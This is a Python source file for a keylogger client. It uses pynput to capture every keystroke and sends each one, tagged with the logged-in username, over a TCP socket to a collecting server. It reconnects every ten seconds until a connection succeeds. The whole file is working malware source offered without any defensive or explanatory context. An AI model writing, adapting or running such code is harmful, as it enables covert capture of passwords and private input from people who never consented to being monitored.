import keylogger
from pynput.keyboard import Key, Listener
import socket
import getpass
import time

client = None

def on_press(key):

	sendServer(str(key).replace("'", ""))

def sendServer(key):
	global client
	client.send(getpass.getuser().encode() + key.encode())

def on_release(key):
	if key == Key.esc:
		return False

def main():
	global client

	while True:
		try:
			print("trying to socket")
			client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			print("trying to connect")
			client.connect(("127.0.0.1", 1717))
			print("trying to send")
			client.send("new".encode() + getpass.getuser().encode())
			#client.send("new".encode() + input("username: ").encode())
			break
		except Exception as e:
			#waiting for connection on the other side to work
			print(str(e))
			time.sleep(10)

	print("connected to server")

	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

	client.shutdown(2)
	client.close()

if __name__ == '__main__':
	main()